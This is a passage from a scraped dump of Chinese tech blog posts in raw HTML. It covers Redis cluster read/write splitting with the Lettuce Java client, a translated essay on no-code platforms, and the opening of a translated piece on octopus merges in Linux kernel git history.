data-line=\"crayon-5bab671054334759364269-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054334759364269-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054334759364269-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054334759364269-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054334759364269-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054334759364269-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054334759364269-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054334759364269-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054334759364269-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5bab671054334759364269-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab671054334759364269-12\">12</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab671054334759364269-1\"><span class=\"crayon-sy\">@</span><span class=\"crayon-e\">SpringBootApplication</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054334759364269-2\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">NewRedisClientApplication</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054334759364269-3\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054334759364269-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054334759364269-5\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">ApplicationContext </span><span class=\"crayon-v\">context</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SpringApplication</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">run</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">NewRedisClientApplication</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">class</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054334759364269-6\"> </div><div class=\"crayon-line\" id=\"crayon-5bab671054334759364269-7\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">StatefulRedisClusterConnection</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">redisClusterConnection</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">StatefulRedisClusterConnection</span><span class=\"crayon-sy\">)</span><span class=\"crayon-v\">context</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getBean</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"redisClusterConnection\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054334759364269-8\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">redisClusterConnection</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">sync</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">get</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"event:10\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5bab671054334759364269-9\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054334759364269-10\"> </div><div class=\"crayon-line\" id=\"crayon-5bab671054334759364269-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab671054334759364269-12\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0025 seconds] -->\r\n<p>运行的结果如下图所示：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/e26e11de6f3891cc1e918325a35ceb23.png\" alt=\"\"></p>\n<p>可以看到，经过改写的redisClusterConnection的确能读取到redis-cluster的数据。但这一个数据我们还需要验证一下到底是不是通过slave读取到的，又或者还是通过slave重定向给master才获取到的？<br>\n带着疑问，我们可以开通debug模式，在redisClusterConnection.sync().get(“event:10”)等类似的获取数据的代码行上面打上断点。通过代码的走查，我们可以看到，在ReadFromImpl类中，最终会select到key所在的slave节点，进行返回，并在该slave中进行数据的读取：</p>\n<p>ReadFromImpl显示：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/4de3e144357875553baf9a44d40ef752.png\" alt=\"\"></p>\n<p>另外我们通过connectFuture中的显示也验证了对于slave的readonly生效了：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/08/ae26aa081060777e2d57667117fae9a0.png\" alt=\"\"></p>\n<p>这样，就达到了通过Lettuce客户端对redis-cluster的读写分离了。</p>\n<p>使用该方案进行redis-cluster性能的提升的优点有：<br>\n（1）直接通过代码级更改，而不需要配置新的redis-cluster环境。<br>\n（2）无需增加机器或升级硬件设备。</p>\n<p>但同时，该方案也有缺点：<br>\n（1）非官方对redis-cluster的推荐方案，因为在redis-cluster架构下，进行读写分离，有可能会读到过期的数据。<br>\n（2）需对项目进行全面的替换，将Jedis客户端变为Lettuce客户端，对代码的改动较大，而且使用Lettuce时，使用的并非spring boot的自带集成Lettuce的redisTemplate配置方法，而是自己配置读写分离的 redisClusterConnetcion，日后遇到问题的时候，可能官方文档的支持率或支撑能力会比较低。<br>\n（3）需修改redis-cluster的master、slave配置，在各个节点中都需要加入slave-read-only yes。<br>\n（4）性能的提升没有水平扩展master主机和实例来得直接干脆。</p>\n<p> </p>\n<h2>总结</h2>\n<p>总体上来说，redis-cluster高可用架构方案是目前最好的redis架构方案，redis的官方对redis-cluster架构是建议redis-master用于接收读写，而redis-slave则用于备份（备用），默认不建议读写分离。但如果不介意读取的是redis-cluster中有可能过期的数据并且对写请求不感兴趣时，则亦可通过readonly命令，将slave设置成可读，然后通过slave获取相关的key，达到读写分离。Jedis、Lettuce都可以进行redis-cluster的读写操作，而且默认只针对Master进行读写，若要对redis-cluster架构下进行读写分离，则Jedis需要进行源码的较大改动，而Lettuce开放了setReadFrom()方法，可以进行二次封装成读写分离的客户端，相对简单，而且Lettuce比Jedis更安全。redis-cluster架构下可以直接通过水平扩展master来达到性能的提升。</p>\n<p> </p>\n<h2>参考文档</h2>\n<p>1，网文《关于redis主从、哨兵、集群的介绍》：https://blog.csdn.net/c295477887/article/details/52487621<br>\n2，知乎《lettuce与jedis对比介绍》：https://www.zhihu.com/question/53124685<br>\n3，网文《Redis 高可用架构最佳实践问答集锦》：http://www.talkwithtrend.com/Article/178165<br>\n4，网文《Redis进阶实践之十一 Redis的Cluster集群搭建》：https://www.cnblogs.com/PatrickLiu/p/8458788.html<br>\n5，redis官方在线文档：https://redis.io/<br>\n6，网文《redis cluster的介绍及搭建(6)》：https://blog.csdn.net/qq1137623160/article/details/79184686<br>\n7，网文《Springboot2.X集成redis集群(Lettuce)连接》：http://www.cnblogs.com/xymBlog/p/9303032.html<br>\n8，Jedis的gitHub地址：https://github.com/xetorthio/jedis<br>\n9，Lettuce的gitHub地址：https://github.com/lettuce-io/lettuce-core/</p>\n<div>\n<div><!-- oschina-blog-728x90 --> <ins></ins></div>\n</div>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114270\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114270votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114270\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 2 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/c766feed221138f7946130756cddfc7e86e388b4.jpg"}
{"title": "软件的未来是无码", "url": "http://blog.jobbole.com/114285/", "create_date": "2018/08/20", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/08/programmer-developer-at-work.jpg"], "url_object_id": "9de23d03feb38819503ac2b7b86f3150", "praise_nums": 1, "fav_nums": 0, "comment_nums": 0, "tags": "IT技术,编程", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://medium.com/s/story/the-future-of-software-is-no-code-7140bd0c30e3\">Greg Satell</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/the-future-of-software-is-no-code\">开源中国</a>   </div><p>早期的数字计算机不是很有用。当然，它们远比它们所取代的穿孔卡片制表机强大得多，但它们很难编程。指令需要用汇编代码编写，这很浪费时间，也很难。</p>\n<p>John Backus在20世纪50年代早期开始开发FORTRAN，计算机系统开始发生变化，它用命令语句代替了汇编语言，将与英语大致相似的东西编译成底层代码。后来的语言建立在基本逻辑之上，将低级代码的命令编译成更简单的代码。</p>\n<p>现今，公司大多喜欢Quick Base、Mendix, 和 Zudy。这种创新性产品（工具），他们的运作的方式都是类似的，试图将代码转换为可视化界面。就像从汇编代码转换到FORTRAN一样，底层代码还是存在的，但它可以更简单地来表示。这些低代码/无代码平台开始瓦解企业中软件运行的方式。</p>\n<blockquote><p>可视化界面是无代码平台强大功能的关键。</p></blockquote>\n<h3>云中断和应用程序编程接口经济</h3>\n<p>传统上，技术受惠于大型企业。开发系统需要对硬件进行大量的投资，以及设计应用程序的昂贵顾问。一旦它们被建造出来，它们也很难改造和升级，所以系统将会持续数年——有时甚至几十年——而不会做较大的升级。</p>\n<p>“我们的态度是，‘我们建造它，你应该喜欢它’，”Quick Base的战略和产品管理高级副总裁杰伊贾米森这么告诉我。因此，遗留系统占了上风，人们只是学会了在他们周围工作，在检查清单和Excel电子表格上做一些事情。它不是很有效率，但基本上是有效的。</p>\n<p>云使任何有互联网连接的人都可以使用强大的系统，从而破坏了许多遗留系统。即使是最小的初创公司，也可以使用大企业可用的技术，而不必预先支付费用。也许同样重要的是，这些系统可以通过应用程序编程接口(API)连接到其他系统。</p>\n<p>云计算和api为小型敏捷公司提供了很多优势。如果没有遗留系统的阻碍，它们可以比规模更大的竞争对手更快地部署云技术，并为客户提供更好的服务。但是没有代码的平台正在帮助大型企业以创业公司的速度和敏捷性前进。</p>\n<h4>克服遗留系统</h4>\n<p>作为设施管理行业的高管，Bruce Squibb深知遗留系统的局限性。在设施管理中，每个项目本质上都是独一无二的，系统需要适应不同类型的架构、客户需求、维护计划等等。</p>\n<p>例如，Squibb的公司 Able Services 最近签了一份合同，为一家大型大学管理几个校区的清洁服务。要想有效地开始这份事业，你需要管理很多零碎的事情，同时还要让经理、一线员工和客户保持一致。这是一份辛苦的工作。</p>\n<p>早些年，大部分工作都是通过电子表格来完成的，这些电子表格会被发送回中央办公室，在主报告中进行更新。然而，Squibb的团队使用Quick Base设计了一个应用程序，它使之前很多需要做的事情都自动化了，这有助于他的团队更快地运行，更透明，错误更少。</p>\n<p>也许更重要的是，因为Quick Base是一个没有代码的平台，应用程序可以很容易地根据需要进行定制和扩展。例如，如果客户制定了新的设施法规或购买了新的设备，应用程序可以在考虑到这些更改需求后短短几个小时内进行更改。</p>\n<p><strong>推翻传统商业模型</strong></p>\n<p>实际上，非编码平台推翻了传统的IT模型。一线管理者越来越变成开发活动的关键部分，而不是过去由程序员主导的应用应该看起来是什么样子。过去管理者只能通过Excel表或者检查表来工作，现在这些都可以搬到云端了。</p>\n<p>“非编码或少编码平台的最大好处是它让你所见即所得地处理开发元素而不需要写代码。这可以加速开发进程并同时提升软件质量。”Marshal Worster告诉我，他是Mendix的解决方案架构师，高级总监。</p>\n<p>可视化接口是非编码平台最关键的部分。 因为它是如此易用，前端管理者和其它非技术人员也可以做一些前端的工作。例如构建屏幕布局，设计和添加功能等。他们再也不必跟开发人员一遍遍解释他们想要什么，应该是什么样子了。</p>\n<blockquote><p>今天，计算机已经无处不在了。</p></blockquote>\n<p>基本上，非编码或少编码平台让十几年前的敏捷开发运动成为了现实，迈出了长足的一步。越来越多的企业开始主动地参与到软件开发中来。</p>\n<p><strong>建造敏捷企业</strong></p>\n<p>相对于早期的计算技术，我们已经前进了一大步。在当年计算机还是一个隐藏在屋子里的庞然大物时，它只能由那些通晓晦涩计算机语言的精英人群来操作，可是今天，计算机已经无处不在了。</p>\n<p>无编码平台可以满足分布式控制下的分布式功能。“无编码非常灵活，可以满足任何人” Quick Base的Jay Jamison对我说。“敏捷开发活动使得开发者更接近商业决策，无编码平台赋能一线管理者贡献自身价值到开发进程中，并且越来越多地独立完成一些任务。”</p>\n<p>他也指出当一线管理者可以影响到开发进程时，策略和实现可以更好地同步。“你们正在讨论的业务可以在几天或几周内对他们的策略产生影响，而不是几个月或几年”Jamison说。</p>\n<p>今天，计算机已变为基本的商业工具，它越来越显得不那么“高科技”了，可是随着我们赋予这些工具的功能越来越多，我们的生活将会变得更美好。未来的技术总是更人性化。</p>\n<p><strong>作者 Greg Satell</strong></p>\n<p>创新导图作者、演说家、创新顾问 @HBR 和 @ Inc 撰稿人和出版人</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114285\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114285votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114285\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i>  收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/bb38d11fb4038702790e0370ed966c50f186ff40.jpg"}
{"title": "Linux 内核 Git 历史记录中，最大最奇怪的提交信息是这样的", "url": "http://blog.jobbole.com/114256/", "create_date": "2018/08/08", "front_image_url": ["http://wx1.sinaimg.cn/mw690/7cc829d3gy1fu22uq61vrj20mr0d040p.jpg"], "url_object_id": "49d9b4d85782e495ba121f31e9594355", "praise_nums": 1, "fav_nums": 2, "comment_nums": 1, "tags": "IT技术,Git,Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/q3057027161\">可乐</a> 翻译，<a href=\"http://www.jobbole.com/members/hanxiaomax\">艾凌风</a> 校稿。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://www.destroyallsoftware.com/blog/2017/the-biggest-and-weirdest-commits-in-linux-kernel-git-history\">destroyallsoftware</a>。欢迎加入<a target=\"_blank\" href=\"https://github.com/jobbole/translation-project\">翻译组</a>。</div><p><img class=\"alignnone\" src=\"http://wx1.sinaimg.cn/mw690/7cc829d3gy1fu22uq61vrj20mr0d040p.jpg\" width=\"690\" height=\"394\"></p>\n<p>我们通常认为 git merges 有两个父节点。例如，由我写的最新的 Linux 内核合并操作是提交2c5d955,这是 4.10-rc6 版本发行前准备工作的一部分。它有两个父节点:</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6711bdc9f841528109\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n2c5d955 Merge branch 'parisc-4.10-3' of ...\r\n|\r\n*- 2ad5d52 parisc: Don't use BITS_PER_LONG in use ...\r\n*- 53cd1ad Merge branch 'i2c/for-current' of ...</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdc9f841528109-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdc9f841528109-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdc9f841528109-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdc9f841528109-4\">4</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6711bdc9f841528109-1\"><span class=\"crayon-cn\">2c5d955</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Merge </span><span class=\"crayon-i\">branch</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">'parisc-4.10-3'</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdc9f841528109-2\"><span class=\"crayon-o\">|</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdc9f841528109-3\"><span class=\"crayon-o\">*</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2ad5d52</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">parisc</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">Don</span><span class=\"crayon-s\">'t use BITS_PER_LONG in use ...</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdc9f841528109-4\"><span class=\"crayon-s\">*- 53cd1ad Merge branch '</span><span class=\"crayon-v\">i2c</span><span class=\"crayon-o\">/</span><span class=\"crayon-st\">for</span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">current</span>'<span class=\"crayon-h\"> </span><span class=\"crayon-i\">of</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0186 seconds] -->\r\n<p>Git 还支持章鱼式的合并，这意味着可以有超过两个父节点的合并。这对于我们那些从事小型项目开发的人来说，这似乎很奇怪：与三四个父节点合并会不会令人感到困惑？这得看情况而定。有时候，一个内核的维护者需要一次同时合并几十个单独的历史记录。一个接着一个的30个合并提交比起单独的一个30路(30个父节点)合并更加令人困惑，特别是当30路合并没有冲突的时候。</p>\n<p>章鱼式合并可能比你想象地更常见。在内核的提交历史记录中有649,306个提交。其中 46,930 (7.2%) 个提交是合并提交。在合并提交中，有 1,549 (3.3%) 是章鱼式合并。(截止到我当前的 git HEAD 指向的提交 566cf87 。)</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5bab6711bdcab478994990\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ git log --oneline | wc -l\r\n   649306\r\n$ git log --oneline --merges | wc -l\r\n   46930\r\n$ git log --oneline --min-parents=3 | wc -l\r\n    1549</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcab478994990-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcab478994990-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcab478994990-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcab478994990-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5bab6711bdcab478994990-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5bab6711bdcab478994990-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5bab6711bdcab478994990-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">oneline</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcab478994990-2\"><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">649306</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcab478994990-3\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">oneline</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">merges</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcab478994990-4\"><span class=\"crayon-h\">   </span><span class=\"crayon-cn\">46930</span></div><div class=\"crayon-line\" id=\"crayon-5bab6711bdcab478994990-5\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">git </span><span class=\"crayon-v\">log</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">oneline</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-v\">min</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">parents</span><span class=\"crayon-o\">=</span><span class=\"crayon-cn\">3</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">wc</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">l</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5bab6711bdcab478994990-6\"><span class=\"crayon-h\">    </span><span class=\"crayon-cn\">1549</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0015 seconds] -->\r\n<p>作为比较，Rails 的所有提交中的 20% 是合并提交 (12,401/63,111),但没有一个章鱼式合并。Rails 大概更能代表一般的工程; 我认为大多数的 git 用户甚至都不知道章鱼式合并。</p>\n<p>现在，显而易见的问题是: 这些章鱼式合并的规模有多大？ 在这里每行开头的 “&gt;” 是续行符；这个命令写了总共5行。这篇文章中的所有命令都是我在做实验的时候输入到终端里面的，所以它们未必容易看懂。我对于结果更感兴趣，贴出代码只是为了满足那些好奇的人。</p><!-- Crayon Syntax Highlighter v2.7.1.1 